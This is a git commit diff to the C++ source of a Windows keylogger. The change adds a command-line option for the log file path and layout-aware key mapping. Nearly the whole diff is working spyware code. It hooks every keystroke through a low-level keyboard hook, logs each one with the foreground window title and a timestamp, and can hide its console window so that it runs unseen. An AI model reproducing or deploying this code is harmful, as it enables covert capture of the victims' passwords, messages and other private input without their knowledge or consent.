39c20d949a80e1b83a32cdd02557a5a8c63183a1
jb-alvarado <jb@pixelcrusher.de>
2018-11-13 14:59:08 +0100

    add argv for output

--- windows/klog_main.cpp
+++ windows/klog_main.cpp
@@ -2,6 +2,8 @@
 #include <time.h>
 #include <iostream>
 #include <cstdio>
+#include <fstream>
+#include "keylogger.h"
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
@@ -15,7 +17,8 @@ HHOOK _hook;
 // it contains the thing you will need: vkCode = virtual key code.
 KBDLLHOOKSTRUCT kbdStruct;
 
-int Save(int key_stroke, char *file);
+int Save(int key_stroke);
+std::ofstream OUTPUT_FILE;
 
 extern char lastwindow[256];
 
@@ -23,33 +26,33 @@ extern char lastwindow[256];
 // a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
-    if (nCode >= 0)
-    {
-        // the action is valid: HC_ACTION.
-        if (wParam == WM_KEYDOWN)
-        {
-            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
-            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+	if (nCode >= 0)
+	{
+		// the action is valid: HC_ACTION.
+		if (wParam == WM_KEYDOWN)
+		{
+			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
+			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 
-            // save to file
-            Save(kbdStruct.vkCode, "keylogger.log");
-        }
-    }
+			// save to file
+			Save(kbdStruct.vkCode);
+		}
+	}
 
-    // call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
-    return CallNextHookEx(_hook, nCode, wParam, lParam);
+	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
+	return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
 void SetHook()
 {
-    // Set the hook and set it to use the callback function above
-    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
-    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
-    // function that sets and releases the hook.
-    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
-    {
-        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
-    }
+	// Set the hook and set it to use the callback function above
+	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
+	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
+	// function that sets and releases the hook.
+	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
+	{
+		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
+	}
 }
 
 void ReleaseHook()
@@ -57,19 +60,22 @@ void ReleaseHook()
     UnhookWindowsHookEx(_hook);
 }
 
-int Save(int key_stroke, char *file)
+int Save(int key_stroke)
 {
     char lastwindow[256];
 
-    if ((key_stroke == 1) || (key_stroke == 2))
-        return 0; // ignore mouse clicks
+	if ((key_stroke == 1) || (key_stroke == 2))
+		return 0; // ignore mouse clicks
 
+	HWND foreground = GetForegroundWindow();
+    DWORD threadID;
+    HKL layout;
+    if (foreground) {
+        //get keyboard layout of the thread
+        threadID = GetWindowThreadProcessId(foreground, NULL);
+        layout = GetKeyboardLayout(threadID);
+    }
 
-    FILE *OUTPUT_FILE;
-    OUTPUT_FILE = fopen(file, "a+");
-
-
-    HWND foreground = GetForegroundWindow();
     if (foreground)
     {
         char window_title[256];
@@ -84,7 +90,7 @@ int Save(int key_stroke, char *file)
             char s[64];
             strftime(s, sizeof(s), "%c", tm);
 
-            fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s]\n", window_title, s);
+            OUTPUT_FILE << "\n\n[Window: "<< window_title << " - at " << s << "]\n";
         }
     }
 
@@ -100,83 +106,96 @@ int Save(int key_stroke, char *file)
     std::cout << key_stroke << '\n';
 
     if (key_stroke == VK_BACK)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[BACKSPACE]");
+        OUTPUT_FILE << buff << "\t[BACKSPACE]\n";
     else if (key_stroke == VK_RETURN)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[ENTER]");
+        OUTPUT_FILE << buff << "\t[ENTER]\n";
     else if (key_stroke == VK_SPACE)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[SPACE]");
+        OUTPUT_FILE << buff << "\t[SPACE]\n";
     else if (key_stroke == VK_TAB)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[TAB]");
+        OUTPUT_FILE << buff << "\t[TAB]\n";
     else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[SHIFT]");
+        OUTPUT_FILE << buff << "\t[SHIFT]\n";
     else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff,  "[CONTROL]");
+        OUTPUT_FILE << buff <<  "\t[CONTROL]\n";
     else if (key_stroke == VK_ESCAPE)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[ESCAPE]");
+        OUTPUT_FILE << buff << "\t[ESCAPE]\n";
     else if (key_stroke == VK_END)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[END]");
+        OUTPUT_FILE << buff << "\t[END]\n";
     else if (key_stroke == VK_HOME)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[HOME]");
+        OUTPUT_FILE << buff << "\t[HOME]\n";
     else if (key_stroke == VK_LEFT)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[LEFT]");
+        OUTPUT_FILE << buff << "\t[LEFT]\n";
     else if (key_stroke == VK_UP)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[UP]");
+        OUTPUT_FILE << buff << "\t[UP]\n";
     else if (key_stroke == VK_RIGHT)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[RIGHT]");
+        OUTPUT_FILE << buff << "\t[RIGHT]\n";
     else if (key_stroke == VK_DOWN)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[DOWN]");
+        OUTPUT_FILE << buff << "\t[DOWN]\n";
     else if (key_stroke == 190 || key_stroke == 110)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, ".");
+        OUTPUT_FILE << buff << "\t.\n";
     else if (key_stroke == 189 || key_stroke == 109)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "-");
+        OUTPUT_FILE << buff << "\t-\n";
     else if (key_stroke == 20)
-        fprintf(OUTPUT_FILE, "%s    %s\n", buff, "[CAPSLOCK]");
+        OUTPUT_FILE << buff << "\t[CAPSLOCK]\n";
     else {
-        if (key_stroke >= 96 && key_stroke <= 105)
-        {
-            key_stroke -= 48;
-            }
-        else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
-                                                    // check caps lock
-            bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+        char key;
+        // check caps lock
+        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
-            // check shift key
-            if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0) {
-                lowercase = !lowercase;
-            }
-
-            if (lowercase) key_stroke += 32;
+        // check shift key
+        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
+            lowercase = !lowercase;
         }
-        fprintf(OUTPUT_FILE, "%s    %c\n", buff, key_stroke);
-    }
-    // NOTE: Numpad-Keys seem to print as lowercase letters
 
-    fclose(OUTPUT_FILE);
-    return 0;
+        //map virtual key according to keyboard layout
+        key = MapVirtualKeyExA(key_stroke,MAPVK_VK_TO_CHAR, layout);
+
+        //tolower converts it to lowercase properly
+        if (!lowercase) key = tolower(key);
+		OUTPUT_FILE << buff << "\t" << char(key) << "\n";
+    }
+	//instead of opening and closing file handlers every time, keep file open and flush.
+    OUTPUT_FILE.flush();
+	return 0;
 }
 
 void Stealth()
 {
-    #ifdef visible
-        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
-    #endif // visible
+	#ifdef visible
+		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
+	#endif // visible
 
-    #ifdef invisible
-        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
-    #endif // invisible
+	#ifdef invisible
+		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
+	#endif // invisible
 }
 
-int main()
+int main(int argc, const char *argv[])
 {
-    // visibility of window
-    Stealth();
-
-    // Set the hook
-    SetHook();
-
-    // loop to keep the console application running.
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0))
-    {
+    if(argc == 2) {
+        if(strcmp(argv[1], "clear") == 0) {
+            fflush(stdout);
+            exit(1);
+        } else {
+            logfileLocation = argv[1];
+        }
     }
+
+    printf("Logging to: %s\n", logfileLocation);
+    fflush(stdout);
+
+	//open output file in append mode
+    OUTPUT_FILE.open(logfileLocation,std::ios_base::app);
+
+	// visibility of window
+	Stealth();
+
+	// Set the hook
+	SetHook();
+
+	// loop to keep the console application running.
+	MSG msg;
+	while (GetMessage(&msg, NULL, 0, 0))
+	{
+	}
 }
